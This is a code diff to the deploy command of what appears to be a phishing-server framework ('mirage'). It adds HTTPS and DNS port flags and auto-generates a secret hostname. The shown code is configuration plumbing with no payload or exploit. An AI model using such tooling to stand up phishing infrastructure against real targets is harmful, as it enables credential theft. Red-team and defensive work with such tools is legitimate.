@@ -6,6 +6,7 @@ import (
 	"path/filepath"
 
 	"github.com/spf13/cobra"
+	"github.com/travisbale/mirage/internal/config"
 	"github.com/travisbale/mirage/internal/deploy"
 )
 
@@ -13,6 +14,8 @@ func newDeployCmd() *cobra.Command {
 	var (
 		domain     string
 		externalIP string
+		httpsPort  int
+		dnsPort    int
 		sshKey     string
 		sshUser    string
 		binary     string
@@ -42,12 +45,18 @@ After a successful deploy, add the server with:
 				sshKey = filepath.Join(home, ".ssh", "id_rsa")
 			}
 
+			if secretHost == "" {
+				secretHost = deploy.GenerateSecretHostname(domain)
+			}
+
 			cfg := deploy.DeployConfig{
 				Host:             host,
 				SSHUser:          sshUser,
 				SSHKeyPath:       sshKey,
 				Domain:           domain,
 				ExternalIPv4:     externalIP,
+				HTTPSPort:        httpsPort,
+				DNSPort:          dnsPort,
 				AutoCert:         true,
 				RemoteBinaryPath: "/usr/local/bin/miraged",
 				RemoteConfigDir:  configDir,
@@ -87,6 +96,8 @@ After a successful deploy, add the server with:
 
 	cmd.Flags().StringVar(&domain, "domain", "", "base domain for the phishing server (required)")
 	cmd.Flags().StringVar(&externalIP, "ip", "", "external IPv4 address of the server (required)")
+	cmd.Flags().IntVar(&httpsPort, "https-port", config.DefaultHTTPSPort, "HTTPS listen port")
+	cmd.Flags().IntVar(&dnsPort, "dns-port", config.DefaultDNSPort, "DNS listen port")
 	cmd.Flags().StringVar(&sshKey, "ssh-key", "", "path to SSH private key (default: ~/.ssh/id_rsa)")
 	cmd.Flags().StringVar(&sshUser, "ssh-user", "root", "SSH username")
 	cmd.Flags().StringVar(&binary, "binary", "", "local miraged binary to upload (default: current executable)")
